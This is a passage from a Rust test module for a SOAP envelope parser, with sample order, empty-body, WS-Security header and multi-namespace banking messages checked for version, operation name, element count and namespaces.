        assert!(!header.elements[0].must_understand);
    }

    // --- Complex / realistic SOAP messages ---

    #[test]
    fn test_complex_soap_12_with_multiple_body_elements() {
        let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<soap12:Envelope xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"
                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <soap12:Body>
    <m:PlaceOrder xmlns:m="http://example.org/orders">
      <m:Customer>
        <m:Name>Jane Doe</m:Name>
        <m:Email>jane@example.org</m:Email>
      </m:Customer>
      <m:Items>
        <m:Item>
          <m:SKU>WIDGET-001</m:SKU>
          <m:Quantity>3</m:Quantity>
          <m:Price>19.99</m:Price>
        </m:Item>
        <m:Item>
          <m:SKU>GADGET-002</m:SKU>
          <m:Quantity>1</m:Quantity>
          <m:Price>49.99</m:Price>
        </m:Item>
      </m:Items>
      <m:ShippingAddress>
        <m:Street>123 Main St</m:Street>
        <m:City>Springfield</m:City>
        <m:State>IL</m:State>
        <m:Zip>62704</m:Zip>
      </m:ShippingAddress>
    </m:PlaceOrder>
  </soap12:Body>
</soap12:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.version, SoapVersion::Soap12);
        assert_eq!(envelope.body.operation, Some("PlaceOrder".to_string()));
        // Count elements: PlaceOrder, Customer, Name, Email, Items, Item, SKU, Quantity, Price,
        //                 Item, SKU, Quantity, Price, ShippingAddress, Street, City, State, Zip = 18
        assert_eq!(envelope.body.analysis.element_count, 18);
    }

    #[test]
    fn test_soap_envelope_only_body_no_content() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.version, SoapVersion::Soap11);
        assert!(envelope.body.operation.is_none());
        assert_eq!(envelope.body.analysis.element_count, 0);
    }

    #[test]
    fn test_soap_with_ws_security_full_header() {
        let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
                   xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <wsu:Timestamp wsu:Id="TS-1">
        <wsu:Created>2025-06-15T10:00:00Z</wsu:Created>
        <wsu:Expires>2025-06-15T10:05:00Z</wsu:Expires>
      </wsu:Timestamp>
      <wsse:UsernameToken wsu:Id="UT-1">
        <wsse:Username>admin</wsse:Username>
        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">hashedpassword</wsse:Password>
        <wsse:Nonce>dGVzdG5vbmNl</wsse:Nonce>
        <wsu:Created>2025-06-15T10:00:00Z</wsu:Created>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <m:GetSecret xmlns:m="http://example.org/secure">
      <m:Id>42</m:Id>
    </m:GetSecret>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.version, SoapVersion::Soap11);
        let header = envelope.header.as_ref().unwrap();
        let security = header.security.as_ref().unwrap();
        assert!(security.timestamp.is_some());
        assert!(security.username_token.is_some());
        assert!(!security.has_saml_assertion);
        assert_eq!(envelope.body.operation, Some("GetSecret".to_string()));
    }

    #[test]
    fn test_multiple_namespaces_in_body() {
        let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:Transfer xmlns:m="http://example.org/banking">
      <m:From xmlns:acc="http://example.org/accounts">
        <acc:AccountId>123</acc:AccountId>
      </m:From>
      <m:To xmlns:acc="http://example.org/accounts">
        <acc:AccountId>456</acc:AccountId>
      </m:To>
      <m:Amount xmlns:cur="http://example.org/currency">
        <cur:Value>100.00</cur:Value>
        <cur:Currency>USD</cur:Currency>
      </m:Amount>
    </m:Transfer>
  </soap:Body>
</soap:Envelope>"#;

        let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
        assert_eq!(envelope.body.operation, Some("Transfer".to_string()));
        // The namespaces found should include what's declared on direct body child elements
        assert!(envelope
            .body
            .analysis
            .namespaces
            .contains(&"http://example.org/banking".to_string()));
    }
}
